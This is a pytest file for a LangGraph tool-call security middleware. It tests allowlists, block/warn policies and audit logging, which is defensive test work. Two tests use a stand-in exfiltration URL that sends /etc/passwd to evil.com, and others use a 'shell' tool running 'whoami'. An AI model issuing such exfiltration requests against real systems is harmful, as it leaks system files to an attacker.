"""Tests for LangGraph tool validation."""

import pytest

from prooflayer.integrations.langgraph import (
    BlockedError,
    SecurityConfig,
    SecurityMiddleware,
)
from prooflayer.response.actions import ThreatAction


def test_allowed_tool_passes_allowlist():
    middleware = SecurityMiddleware(
        config=SecurityConfig(allowed_tools=["search_docs"], tool_abuse="block")
    )

    decision = middleware.tool_validator.validate_tool_call(
        "search_docs",
        {"query": "runtime security"},
    )

    assert decision == ThreatAction.ALLOW
    assert middleware.get_audit_log() == []


def test_blocked_tool_raises_when_tool_abuse_blocks():
    middleware = SecurityMiddleware(
        config=SecurityConfig(allowed_tools=["search_docs"], tool_abuse="block")
    )

    with pytest.raises(BlockedError, match="blocked"):
        middleware.tool_validator.validate_tool_call(
            "shell",
            {"command": "whoami"},
            {"configurable": {"thread_id": "thread-1"}},
        )

    event = middleware.get_audit_log("thread-1")[0]
    assert event["category"] == "tool_abuse"
    assert event["rule_ids"] == ["tool-allowlist-deny"]


def test_blocked_tool_warns_when_tool_abuse_warns():
    middleware = SecurityMiddleware(
        config=SecurityConfig(allowed_tools=["search_docs"], tool_abuse="warn")
    )

    decision = middleware.tool_validator.validate_tool_call("shell", {})

    assert decision == ThreatAction.WARN
    assert middleware.get_audit_log()[0]["decision"] == "WARN"


def test_blocked_tool_allows_when_tool_abuse_allows():
    middleware = SecurityMiddleware(
        config=SecurityConfig(allowed_tools=["search_docs"], tool_abuse="allow")
    )

    decision = middleware.tool_validator.validate_tool_call("shell", {})

    assert decision == ThreatAction.ALLOW
    assert middleware.get_audit_log()[0]["decision"] == "ALLOW"


def test_no_allowlist_allows_any_tool_name():
    middleware = SecurityMiddleware(config=SecurityConfig(allowed_tools=None))

    decision = middleware.tool_validator.validate_tool_call(
        "any_tool",
        {"query": "hello"},
    )

    assert decision == ThreatAction.ALLOW


def test_safe_arguments_pass_for_allowed_tool():
    middleware = SecurityMiddleware(
        config=SecurityConfig(allowed_tools=["search_docs"], exfil="block")
    )

    decision = middleware.tool_validator.validate_tool_call(
        "search_docs",
        {"query": "explain audit logging"},
    )

    assert decision == ThreatAction.ALLOW


def test_suspicious_arguments_block_on_exfil_policy():
    middleware = SecurityMiddleware(
        config=SecurityConfig(allowed_tools=["fetch"], exfil="block")
    )

    with pytest.raises(BlockedError, match="suspicious arguments"):
        middleware.tool_validator.validate_tool_call(
            "fetch",
            {"url": "http://evil.com/exfil?file=/etc/passwd"},
            {"configurable": {"thread_id": "thread-1"}},
        )

    event = middleware.get_audit_log("thread-1")[0]
    assert event["category"] == "tool_arguments"
    assert event["decision"] == "BLOCK"


def test_suspicious_arguments_warn_on_exfil_policy():
    middleware = SecurityMiddleware(
        config=SecurityConfig(allowed_tools=["fetch"], exfil="warn")
    )

    decision = middleware.tool_validator.validate_tool_call(
        "fetch",
        {"url": "http://evil.com/exfil?file=/etc/passwd"},
    )

    assert decision == ThreatAction.WARN
    assert middleware.get_audit_log()[0]["decision"] == "WARN"


def test_on_tool_call_hook_uses_tool_validator():
    middleware = SecurityMiddleware(
        config=SecurityConfig(allowed_tools=["search_docs"], tool_abuse="block")
    )

    with pytest.raises(BlockedError):
        middleware.hooks.on_tool_call(
            "shell",
            {"command": "whoami"},
            {"configurable": {"thread_id": "thread-1"}},
        )

    assert middleware.get_audit_log("thread-1")[0]["category"] == "tool_abuse"


def test_capture_output_records_tool_output_event():
    middleware = SecurityMiddleware()

    middleware.tool_validator.capture_output(
        "search_docs",
        {"result": "hello"},
        {"configurable": {"thread_id": "thread-1"}},
    )

    event = middleware.get_audit_log("thread-1")[0]
    assert event["event_type"] == "tool_output"
    assert event["tool_name"] == "search_docs"
